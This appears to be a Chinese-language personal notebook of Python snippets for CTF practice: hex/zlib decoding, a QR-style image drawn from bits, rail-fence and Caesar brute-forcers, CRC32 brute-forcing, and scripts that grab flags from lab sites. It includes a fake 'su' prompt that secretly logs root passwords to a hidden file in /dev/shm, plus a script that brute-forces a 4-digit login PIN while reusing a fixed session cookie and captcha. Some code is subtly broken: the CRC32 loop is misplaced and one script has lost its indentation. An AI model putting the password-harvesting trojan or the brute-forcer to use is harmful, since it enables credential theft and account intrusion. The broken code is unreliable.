#python编程常用知识点
循环
数组
选择
对象
输入输出
变量
对象
正则表达式
.*()
占位符与转义符


#python基础语法





#zip解压缩及16进制编码
{
#! /usr/bin/env python
import zlib
import binascii
IDAT = "789C5D91011280400802BF04FFFF5C75294B5537738A21A27D1E49CFD17DB3937A92E7E603880A6D485100901FB0410153350DE83112EA2D51C54CE2E585B15A2FC78E8872F51C6FC1881882F93D372DEF78E665B0C36C529622A0A45588138833A170A2071DDCD18219DB8C0D465D8B6989719645ED9C11C36AE3ABDAEFCFC0ACF023E77C17C7897667".decode('hex')
#print IDAT
result = binascii.hexlify(zlib.decompress(IDAT))      
print result
#print result.decode('hex')
}



#PPL编程（画图）
{
#!/usr/bin/env python
import Image
MAX = 25
pic = Image.new("RGB",(MAX, MAX))
str = "1111111000100001101111111100000101110010110100000110111010100000000010111011011101001000000001011101101110101110110100101110110000010101011011010000011111111010101010101111111000000001011101110000000011010011000001010011101101111010101001000011100000000000101000000001001001101000100111001111011100111100001110111110001100101000110011100001010100011010001111010110000010100010110000011011101100100001110011100100001011111110100000000110101001000111101111111011100001101011011100000100001100110001111010111010001101001111100001011101011000111010011100101110100100111011011000110000010110001101000110001111111011010110111011011"
i=0
for y in range (0,MAX):
	for x in range (0,MAX):
		if(str[i] == '1'):
			pic.putpixel([x,y],(0, 0, 0))
		else:
			pic.putpixel([x,y],(255,255,255))
		i = i+1
pic.show()
pic.save("flag.png")     
}



#base64编解码，get/post请求
{
import requests, base64

rsp = requests.get('http://ctf5.shiyanbar.com/web/10/10.php')
tmp = base64.b64decode(rsp.headers['FLAG']).split(':')
rsp = requests.post('http://ctf5.shiyanbar.com/web/10/10.php', data={'key':tmp[-1]})
print rsp.text      
}



#栅栏密码破解
{
#!/usr/bin/env python
# -*- coding: gbk -*-
# -*- coding: utf_8 -*-
# Author: 蔚蓝行
# http://www.cnblogs.com/duanv
e = raw_input('请输入要解密的字符串\n')
elen = len(e)
field=[]
for i in range(2,elen):
            if(elen%i==0):
                field.append(i)

for f in field:
    b = elen / f
    result = {x:'' for x in range(b)}
    for i in range(elen):
        a = i % b;
        result.update({a:result[a] + e[i]})
    d = ''
    for i in range(b):
        d = d + result[i]
    print '分为\t'+str(f)+'\t'+'栏时，解密结果为：  '+d
}



#凯撒密码破解
{	
import sys

def move(src, num):
    for c in src:
        sys.stdout.write(chr(ord(c)+num))
    print
if len(sys.argv) != 2:
    print 'this.py text'
    exit(0)
ciphertext = sys.argv[1]
min,max = 0xff, 0
for c in ciphertext:
    now = ord(c)
    if now < min:
        min = now
    if now > max:
        max = now
rightmove = ord('~')-max
leftmove  = min - ord('0')
for i in range(1, rightmove+1):
    move(ciphertext, i)
for i in range(1, leftmove+1):
    move(ciphertext, -i)	
}


	
#CRC32爆破
{	
#!/usr/bin/env python 
# -*- coding: UTF-8 -*- 
########################################################## 
# 脚本二 : 修正了一些 BUG  , 可以正常打印日志 , 把握进度 # 
# 修改时间 : 2017/03/20 # TODO : 可以穷举的字典的顺序进行调整 , 以字母的统计频率进行调整 
# 可以提高整体穷举效率 
########################################################## 
import binascii 
import time 
import winsound 
startTime = time.time() 
# 程序开始运行 
#----------Config start----------# 
# 需要被破解的CRC32的值 
keys = [int("0xA359AFC1",16), int("0xCF5F72B9",16), int("0xDF7BF1C9",16), int("0x6E38B65E",16)] 
# 设置爆破的范围 , 默认所有可打印字符 
myRange = [' ', '!', '"', '#', '$', '%', '&', '\'', '(', ')', '*', '+', ',', '-', '.', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', ':', ';', '<', '=', '>', '?', '@', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '[', '\\', ']', '^', '_', '`', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '{', '|', '}', '~'] 
# 注 : #     这里的代码可以穷举四位可打印字符 , 可以根据需要修改代码中的嵌套循环层数 #    不知道如何能使用参数控制循环嵌套的层数 , 如果有知道的小伙伴儿一定要联系我哦 , 一起进步 
#----------Config end----------# 
RESULT = {} 
# 结果字典 
def getCRC32(str): 
	'''
	计算CRC32
	''' 
	return (binascii.crc32(str) & 0xffffffff) 
def checkSuccess(keys, mycrc32, words): 
	'''
    检测是否成功匹配
    参数 : 
        keys : 所有需要爆破的CRC32值
        mycrc32 : 某次计算得到的明文(words)的CRC32
        words : 明文
    ''' 
	global RESULT 
	for key in keys: 
		if key == mycrc32: 
			RESULT[keys.index(key)] = words 
			words = "" 
			counter = 0 	# 用于计算速度 
			oldTime = time.clock() 
			for i in myRange: 
				nowTime = time.clock() 
				print "Trying : " + words + "\t" + "Speed : " + str(counter / (nowTime - oldTime)) + " / s" + "\t" + "Result : " + str(RESULT) 	# 输出日志 
				oldTime = nowTime 
				for j in myRange: 
					for k in myRange: 
						for l in myRange: 
							words = i + j + k + l 	# 构造明文 
							counter += 1 
							myCRC32 = getCRC32(words) # 计算明文CRC32 
							checkSuccess(keys, myCRC32, words) # 检查是否匹配 
endTime = time.time() 
print "Result : " + str(RESULT) 	# 输入爆破结果 
print "Cost : " + str(endTime-startTime) + " s" # 输出总花费时间
}

{
    #!/bin/bash/python  
    import sys  
    from collections import Counter  
    file = open(sys.argv[1], 'r')  
    readlist = []  
    count_times = []  
    for line in file.readlines():  
    line = line.strip('\r\n ')  
    readlist.append(line)  
    sortlist = Counter(readlist).most_common()  
    for line in sortlist:  
    print line[0]
}
	
#记录root密码小工具
{
    #!/usr/bin/python  
    import os, sys, getpass, time  
    current_time = time.strftime("%Y-%m-%d %H:%M")  
    logfile="/dev/shm/.su.log"              //密码获取后记录在这里  
    #CentOS                  
    #fail_str = "su: incorrect password"  
    #Ubuntu               
    #fail_str = "su: Authentication failure"  
    #For Linux Korea                    //centos,ubuntu,korea 切换root用户失败提示不一样  
    fail_str = "su: incorrect password" 
    try:  
        passwd = getpass.getpass(prompt='Password: ');  
        file=open(logfile,'a')  
        file.write("[%s]t%s"%(passwd, current_time))   //截取root密码  
        file.write('n')  
        file.close()  
    except:  
        pass 
    time.sleep(1)  
    print fail_str                               //打印切换root失败提示 

}

#设置源端口反弹shell
{

}


#自动获取flag
{
    import requests   
    import base64  
      
    url='http://ctf4.shiyanbar.com/web/10.php'   
    req=requests.get(url)  
    print req.text  
    key=req.headers['FLAG']  
    key=base64.b64decode(key)  
    key=key.split(':')[1].strip()  
    data={'key':key}  
    r=requests.post(url,data=data)   
    print(r.text)  
}
#自动提交flag
{
import requests  
  
url = "http://lab1.xseclab.com/vcode1_bcfef7eacf7badc64aaf18844cdb1c46/login.php"  
req = requests.session()  
header = {"Cookie":"PHPSESSID=9b8f8686269f5d70a44766e3c5f4dcdc"}  
for pwd in xrange(1000,10000):  
  
	data={'username':'admin','pwd':pwd,'vcode':'c3pe'}  
  
	ret = req.post(url, data=data, headers=header)  
	print ret.text  
	if 'error' not in ret.text:  
		print pwd  
		break  
}